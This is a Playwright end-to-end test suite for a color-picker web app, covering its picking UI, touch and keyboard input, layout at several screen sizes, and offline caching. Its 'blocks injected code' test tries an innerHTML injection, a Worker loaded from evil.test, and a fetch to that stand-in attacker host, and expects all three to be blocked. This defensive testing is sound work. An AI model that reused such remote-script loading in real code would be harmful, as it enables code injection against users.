import type { Page } from '@playwright/test'
import { globSync, readFileSync } from 'node:fs'

import { LOOKS } from '../lib/looks.ts'
import { WINNERS } from '../lib/winners.ts'
import { click, expect, getHex, setHex, test } from './fixtures.ts'

function lookNumber(page: Page, number: number) {
  return expect(page.locator('#look-number')).toHaveText(
    `${number} of ${LOOKS.length}`
  )
}

test('picks a color in three steps @mobile', async ({ page }) => {
  await page.goto('/#pick')
  const primer = await getHex(page)
  await page.locator('.ribbon').click({ position: { x: 40, y: 10 } })
  await expect(page.getByLabel('Slide to a color')).toHaveAttribute(
    'aria-valuetext',
    'red'
  )
  const slid = await getHex(page)
  await page.getByRole('radio').nth(5).click()
  await expect(page.getByRole('radio').nth(5)).toBeChecked()
  const shade = await getHex(page)
  await page.getByRole('tab', { name: 'Fine-tune' }).click()
  await click(page, 'Darker by 2')
  await click(page, 'More orange by 1')
  const tuned = await getHex(page)
  expect(new Set([primer, slid, shade, tuned]).size).toBe(4)

  // The closest shade keeps the exact color
  await page.getByRole('tab', { name: 'Tap a shade' }).click()
  await page.getByRole('radio', { checked: true }).click()
  expect(await getHex(page)).toBe(tuned)
})

test('shows the exact color on the swatch', async ({ page }) => {
  await page.goto('/#pick')
  await setHex(page, '#0f4d81')
  const color = await page
    .locator('#pick .swatch')
    .evaluate(swatch => getComputedStyle(swatch, '::before').backgroundColor)
  expect(color).toBe('rgb(15, 77, 129)')
})

test('drags the ribbon', async ({ page }) => {
  await page.goto('/#pick')
  const box = (await page.locator('.ribbon').boundingBox())!
  await page.mouse.move(box.x + 20, box.y + 10)
  await page.mouse.down()
  await page.mouse.move(box.x + box.width + 50, box.y - 200, { steps: 3 })
  await page.mouse.up()
  await expect(page.getByLabel('Slide to a color')).toHaveValue('359')
})

test('works with a keyboard', async ({ page }) => {
  await page.goto('/#pick')
  const seen = new Set([await getHex(page)])
  await page.getByLabel('Slide to a color').press('ArrowRight')
  seen.add(await getHex(page))
  await page.getByRole('radio', { checked: true }).press('ArrowRight')
  seen.add(await getHex(page))
  expect(seen.size).toBe(3)
  await page.getByRole('tab', { selected: true }).press('ArrowLeft')
  await expect(page.getByRole('tab', { name: 'Hex' })).toBeFocused()
  await expect(page.getByLabel('hex code')).toBeVisible()
})

test('replaces colors which only screens can show', async ({ page }) => {
  await page.goto('/#pick')
  await setHex(page, '00ff00')
  await expect(page.locator('#hex-error')).toContainText('#69dc62')
  await setHex(page, '#bb264')
  await expect(page.locator('#hex-error')).toBeEmpty()
  await page.keyboard.press('Enter')
  await expect(page.locator('#hex-error')).toContainText('six letters')
  expect(await getHex(page)).toBe('#69dc62')
  const hue = await page.locator('#hue').inputValue()
  await page.getByLabel('hex code').fill('')
  await page.keyboard.type('#7f7f7f')
  await expect(page.locator('#hex-error')).toBeEmpty()
  await expect(page.locator('#hue')).toHaveValue(hue)
  await setHex(page, 'fff')
  await page.keyboard.press('Enter')
  expect(await getHex(page)).toBe('#f5f5f5')
  await setHex(page, '#f5f5f5')
  await expect(page.locator('#hex-error')).toBeEmpty()
  await setHex(page, '#bb2648')
  await page.locator('.ribbon').click()
  await expect(page.getByLabel('hex code')).toHaveValue(await getHex(page))
})

test('cycles through the looks @mobile', async ({ page }) => {
  await page.goto('/#pick')
  await lookNumber(page, 1)
  await click(page, 'Previous look')
  await lookNumber(page, LOOKS.length)
  for (let i = 1; i <= LOOKS.length + 2; i++) {
    await click(page, 'Next look')
    await lookNumber(page, ((i - 1) % LOOKS.length) + 1)
    await page.waitForTimeout(500)
  }
  await click(page, 'This is the one')
  await expect(page.locator('#sign .look')).toHaveAttribute('data-look', 'suit')
  await page.reload()
  await click(page, 'Change color')
  await lookNumber(page, 2)
})

test('counts fast taps', async ({ page }) => {
  await page.setViewportSize({ height: 520, width: 820 })
  await page.goto('/#pick')
  for (let i = 0; i < 6; i++) await click(page, 'Previous look')
  await lookNumber(page, 5)
})

test('follows fingers @touch', async ({ context, page }) => {
  await page.goto('/#pick')
  const session = await context.newCDPSession(page)
  const touch = (type: 'touchEnd' | 'touchMove' | 'touchStart', x = 0, y = 0) =>
    session.send('Input.dispatchTouchEvent', {
      touchPoints: type === 'touchEnd' ? [] : [{ x, y }],
      type
    })
  await touch('touchStart', 120, 200)
  for (let x = 130; x <= 230; x += 10) await touch('touchMove', x, 200)
  const scroll = () => page.locator('#looks').evaluate(i => i.scrollLeft)
  const held = await scroll()
  await page.waitForTimeout(400)
  expect(await scroll()).toBe(held)
  await touch('touchEnd')
  await lookNumber(page, LOOKS.length)

  const { y } = (await page.locator('.ribbon').boundingBox())!
  await touch('touchStart', 300, y + 10)
  for (let x = 280; x >= 0; x -= 20) await touch('touchMove', x, y - 40)
  await touch('touchEnd')
  await expect(page.locator('#hue')).toHaveValue('0')
})

test('drags the looks with a mouse', async ({ page }) => {
  await page.goto('/#pick')
  const box = (await page.locator('#looks').boundingBox())!
  const [x, y] = [box.x + box.width / 2, box.y + box.height / 2]
  await page.mouse.move(x, y)
  await page.mouse.down()
  await page.mouse.move(x - 250, y, { steps: 5 })
  await page.mouse.up()
  await lookNumber(page, 2)
  await expect(page.locator('#looks')).not.toHaveClass(/is-held/)
})

test('shows past winners from anywhere @mobile', async ({ page }) => {
  await page.goto('/')
  await expect(page.locator('#runway')).toContainText('Cloud Dancer')
  await click(page, 'Make my guess')
  await click(page, 'Past winners')
  await expect(page.locator('#archive > li')).toHaveCount(WINNERS.length)
  const sizes = await page
    .locator('#archive .look')
    .evaluateAll(all => all.map(i => `${i.clientWidth}x${i.clientHeight}`))
  expect(new Set(sizes).size).toBe(1)
  await click(page, 'Back')
  await expect(page).toHaveURL('/#pick')

  await page.goto('/?direct#past')
  await click(page, 'Back')
  await expect(page.getByRole('heading', { level: 1 })).toBeVisible()
})

for (const [width, height] of [
  [320, 568],
  [375, 553],
  [390, 664],
  [844, 340],
  [260, 440],
  [820, 1100],
  [1440, 900]
] as const) {
  test(`fits ${width}×${height}`, async ({ page }) => {
    await page.setViewportSize({ height, width })
    for (const screen of ['start', 'past', 'pick', 'sign']) {
      await page.goto(`/#${screen}`)
      const overflow = await page.evaluate(
        () => document.documentElement.scrollWidth - innerWidth
      )
      expect(overflow, screen).toBe(0)
    }
    await page.goto('/#start')
    const spill = await page
      .locator('#runway .look')
      .first()
      .evaluate(i => i.clientWidth - i.parentElement!.clientWidth)
    expect(spill).toBeLessThanOrEqual(0)
    if (width < 320) return
    if (height > 550 && width > 320) {
      await expect(page.locator('#start .action')).toBeInViewport({ ratio: 1 })
    }
    await page.goto('/#pick')
    await expect(page.getByText('This is the one')).toBeInViewport({ ratio: 1 })
  })
}

test('avoids media queries which old Safari drops', () => {
  for (const file of globSync('dist/assets/*.css')) {
    expect(readFileSync(file, 'utf8')).not.toMatch(/@media[^{]*not \(/)
  }
})

test('loads little and from nowhere else', async ({ page }) => {
  const urls: string[] = []
  page.on('request', request => urls.push(request.url()))
  await page.setViewportSize({ height: 664, width: 390 })
  await page.goto('/')
  await expect(page.locator('#runway [data-look]').first()).toBeVisible()
  await page.waitForLoadState('networkidle')
  expect(urls.filter(i => !i.startsWith('http://localhost'))).toEqual([])
  expect(urls.join()).not.toContain('admin-')
  expect(urls.filter(i => i.includes('-ink')).length).toBeLessThan(7)
})

test('blocks injected code', async ({ page, problems }) => {
  const response = await page.goto('/')
  expect(response!.headers()['x-frame-options']).toBe('DENY')
  const attempts = await page.evaluate(() =>
    Promise.allSettled([
      (async () => {
        // oxlint-disable-next-line no-restricted-properties -- it must throw
        document.body.innerHTML = '<img src=x>'
      })(),
      (async () => new Worker('https://evil.test/x.js'))(),
      fetch('https://evil.test/')
    ])
  )
  expect(attempts.map(i => i.status)).toEqual(Array(3).fill('rejected'))
  problems.length = 0
})

test.describe('service worker', () => {
  test.use({ serviceWorkers: 'allow' })

  test('works offline and cleans old caches @offline', async ({
    context,
    page
  }) => {
    await page.goto('/icon-48.png')
    await page.evaluate(() => caches.open('workbox-precache'))
    await page.goto('/#0.7,0.1,250,100')
    // Replacing the worker of the 2026 site reloads the page
    await page.waitForEvent('load')
    await expect
      .poll(() => page.evaluate(() => caches.keys()))
      .toEqual([expect.stringMatching(/^files-/)])

    await context.setOffline(true)
    const failed: string[] = []
    page.on('requestfailed', request => failed.push(request.url()))
    await page.goto('/?party')
    await click(page, /See all/)
    await page.getByText('Cerulean').last().scrollIntoViewIfNeeded()
    await expect(page.locator('#archive [data-look]').last()).toBeVisible()
    expect(failed).toEqual([])
  })
})
